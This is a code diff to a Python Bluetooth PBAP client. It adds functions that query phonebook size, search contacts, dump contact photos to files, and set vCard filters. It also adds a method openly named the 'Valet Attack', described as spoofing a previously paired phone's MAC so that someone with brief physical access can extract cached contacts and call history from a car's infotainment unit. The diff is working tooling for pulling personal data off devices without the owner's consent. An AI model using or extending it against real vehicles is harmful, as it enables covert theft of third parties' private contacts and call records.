@@ -71,6 +71,7 @@ class PBAPClient:
             self.sock = socket.socket(
                 socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
             )
+            self.sock.settimeout(15.0)
             info(f"Connecting RFCOMM to {self.address} channel {self.channel}...")
             self.sock.connect((self.address, self.channel))
             success("RFCOMM connected")
@@ -245,7 +246,7 @@ class PBAPClient:
             try:
                 data = self.pull_phonebook(path)
                 if data and len(data) > 10:  # More than empty vCard
-                    filename = path.replace("/", "_").replace(".vcf", ".vcf")
+                    filename = path.replace("/", "_")
                     filepath = os.path.join(output_dir, filename)
                     with open(filepath, "w") as f:
                         f.write(data)
@@ -335,7 +336,215 @@ class PBAPClient:
                 break
         return data
 
-    def _build_pbap_app_params(self, max_count: int = 0, offset: int = 0) -> bytes:
+    def get_phonebook_size(self, path: str = "telecom/pb.vcf") -> int:
+        """Query phonebook size without downloading data.
+
+        Returns the number of entries, or -1 on failure.
+        """
+        info(f"Querying phonebook size for {path}...")
+        headers = b""
+        if self.connection_id is not None:
+            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)
+
+        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
+        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes
+
+        type_str = b"x-bt/phonebook\x00"
+        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str
+
+        # MaxListCount=0 returns only the size, not the data
+        app_params = struct.pack(">BBH", 0x04, 0x02, 0)
+        headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
+                               len(app_params) + 3) + app_params
+
+        packet = struct.pack(">BH", OBEX_GET, 3 + len(headers)) + headers
+        self.sock.send(packet)
+
+        response = self._recv_response()
+        if response and response[0] == OBEX_RESPONSE_SUCCESS:
+            # Parse PhonebookSize from application parameters in response
+            size = self._parse_phonebook_size(response)
+            if size >= 0:
+                info(f"Phonebook {path} contains {size} entries")
+            return size
+        return -1
+
+    def _parse_phonebook_size(self, response: bytes) -> int:
+        """Extract PhonebookSize (tag 0x08) from OBEX app params."""
+        offset = 3
+        while offset < len(response):
+            hid = response[offset]
+            if hid == OBEX_HEADER_APP_PARAMS:
+                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
+                params = response[offset + 3:offset + length]
+                # Parse TLV params
+                p = 0
+                while p < len(params) - 1:
+                    tag = params[p]
+                    tag_len = params[p + 1]
+                    if tag == 0x08 and tag_len == 2 and p + 4 <= len(params):
+                        return struct.unpack(">H", params[p + 2:p + 4])[0]
+                    p += 2 + tag_len
+                offset += length
+            elif hid & 0xC0 in (0x00, 0x40):
+                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
+                offset += length
+            elif hid & 0xC0 == 0x80:
+                offset += 2
+            elif hid & 0xC0 == 0xC0:
+                offset += 5
+            else:
+                break
+        return -1
+
+    def search_phonebook(self, search_value: str,
+                          search_by: str = "name",
+                          path: str = "telecom/pb") -> str:
+        """Search phonebook by name or number.
+
+        Args:
+            search_value: String to search for
+            search_by: "name" (0x00), "number" (0x01), or "sound" (0x02)
+            path: PBAP folder to search in
+
+        Returns:
+            XML vCard listing of matching entries
+        """
+        search_attr = {"name": 0x00, "number": 0x01, "sound": 0x02}.get(search_by, 0x00)
+        info(f"Searching phonebook by {search_by}: '{search_value}'")
+
+        headers = b""
+        if self.connection_id is not None:
+            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)
+
+        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
+        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes
+
+        type_str = b"x-bt/vcard-listing\x00"
+        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str
+
+        # App params: SearchAttribute + SearchValue
+        search_bytes = search_value.encode("utf-8") + b"\x00"
+        app_params = struct.pack(">BBB", 0x02, 0x01, search_attr)  # SearchAttribute
+        app_params += struct.pack(">BB", 0x03, len(search_bytes)) + search_bytes  # SearchValue
+
+        headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
+                               len(app_params) + 3) + app_params
+
+        packet = struct.pack(">BH", OBEX_GET, 3 + len(headers)) + headers
+        self.sock.send(packet)
+
+        body = b""
+        while True:
+            response = self._recv_response()
+            if response is None:
+                break
+            opcode = response[0]
+            body_data = self._extract_body(response)
+            if body_data:
+                body += body_data
+            if opcode == OBEX_RESPONSE_SUCCESS:
+                break
+            elif opcode == OBEX_RESPONSE_CONTINUE:
+                cont_headers = b""
+                if self.connection_id is not None:
+                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
+                                                self.connection_id)
+                self.sock.send(struct.pack(">BH", OBEX_GET, 3 + len(cont_headers)) + cont_headers)
+            else:
+                break
+
+        result = body.decode("utf-8", errors="replace")
+        if result:
+            success(f"Search returned results ({len(result)} bytes)")
+        else:
+            warning("No matching entries found")
+        return result
+
+    def pull_with_photo(self, path: str = "telecom/pb.vcf",
+                         output_dir: str = "pbap_photos") -> dict:
+        """Pull phonebook with embedded photos extracted to files.
+
+        Downloads vCards with PHOTO property (filter bit 3) enabled,
+        then extracts base64-encoded JPEG/PNG images to separate files.
+
+        Returns:
+            Dict mapping contact name to photo file path
+        """
+        import base64
+        import re
+
+        info("Pulling phonebook with photos...")
+        data = self.pull_phonebook(path)
+        if not data:
+            return {}
+
+        os.makedirs(output_dir, exist_ok=True)
+        photos = {}
+
+        # Parse vCards for PHOTO property
+        current_name = ""
+        in_photo = False
+        photo_data = []
+
+        for line in data.splitlines():
+            if line.startswith("FN:") or line.startswith("FN;"):
+                current_name = line.split(":", 1)[1].strip()
+            elif line.startswith("PHOTO;"):
+                in_photo = True
+                photo_data = []
+                # Some formats put data on same line after base64:
+                if ":" in line:
+                    b64_part = line.split(":", 1)[1].strip()
+                    if b64_part:
+                        photo_data.append(b64_part)
+            elif in_photo:
+                if line.startswith(" ") or line.startswith("\t"):
+                    photo_data.append(line.strip())
+                else:
+                    # End of photo data
+                    if photo_data and current_name:
+                        try:
+                            raw = base64.b64decode("".join(photo_data))
+                            ext = "jpg" if raw[:2] == b"\xff\xd8" else "png"
+                            safe_name = re.sub(r'[^\w\-]', '_', current_name)[:50]
+                            photo_file = os.path.join(output_dir, f"{safe_name}.{ext}")
+                            with open(photo_file, "wb") as f:
+                                f.write(raw)
+                            photos[current_name] = photo_file
+                            success(f"  Photo: {current_name} -> {photo_file}")
+                        except Exception:
+                            pass
+                    in_photo = False
+                    photo_data = []
+
+        info(f"Extracted {len(photos)} contact photo(s)")
+        return photos
+
+    def pull_stale_data(self, output_dir: str = "pbap_stale") -> dict:
+        """Attempt to pull phonebook data that may be cached from previous pairings.
+
+        IVIs often cache phonebook data in cleartext even after the phone disconnects.
+        By spoofing a previously-paired phone's MAC and connecting to the IVI,
+        we can access the cached data without re-pairing.
+
+        This is the "Valet Attack" — a parking valet or mechanic with temporary
+        physical access can extract all contacts and call history.
+        """
+        info("Attempting stale data extraction (cached from previous pairing)...")
+        info("This works when spoofing a previously-paired phone's MAC")
+
+        results = self.pull_all_data(output_dir)
+        if results:
+            success(f"Extracted {len(results)} cached phonebook objects")
+            info("This data may include contacts from a previously-paired phone")
+        else:
+            warning("No cached phonebook data found — IVI may have cleared cache")
+        return results
+
+    def _build_pbap_app_params(self, max_count: int = 0, offset: int = 0,
+                                vcard_version: int = 1,
+                                filter_bits: int | None = None) -> bytes:
         """Build PBAP Application Parameters header.
 
         Tag IDs per PBAP spec:
@@ -343,11 +552,23 @@ class PBAPClient:
           0x05 = ListStartOffset (2 bytes)
           0x06 = Filter (8 bytes) - which vCard fields to include
           0x07 = Format (1 byte) - 0=vCard2.1, 1=vCard3.0
+
+        Filter bits (64-bit bitmask):
+          bit 0: VERSION       bit 1: FN          bit 2: N
+          bit 3: PHOTO         bit 4: BDAY        bit 5: ADR
+          bit 6: LABEL         bit 7: TEL         bit 8: EMAIL
+          bit 9: MAILER        bit 10: TZ         bit 11: GEO
+          bit 12: TITLE        bit 13: ROLE       bit 14: LOGO
+          bit 15: AGENT        bit 16: ORG        bit 17: NOTE
+          bit 18: REV          bit 19: SOUND      bit 20: URL
+          bit 21: UID          bit 22: KEY        bit 23: NICKNAME
+          bit 24: CATEGORIES   bit 25: PROID      bit 26: CLASS
+          bit 27: SORT-STRING  bit 28: X-IRMC-CALL-DATETIME
         """
         params = b""
 
-        # Format: vCard 3.0
-        params += struct.pack(">BBB", 0x07, 0x01, 0x01)
+        # Format: 0=vCard 2.1, 1=vCard 3.0
+        params += struct.pack(">BBB", 0x07, 0x01, vcard_version)
 
         if max_count > 0:
             params += struct.pack(">BBH", 0x04, 0x02, max_count)
@@ -355,7 +576,11 @@ class PBAPClient:
         if offset > 0:
             params += struct.pack(">BBH", 0x05, 0x02, offset)
 
-        # Filter: include all fields
-        params += struct.pack(">BB", 0x06, 0x08) + b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
+        # Filter: specific bits or all fields
+        if filter_bits is not None:
+            params += struct.pack(">BB", 0x06, 0x08) + struct.pack(">Q", filter_bits)
+        else:
+            # All fields
+            params += struct.pack(">BB", 0x06, 0x08) + b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
 
         return params
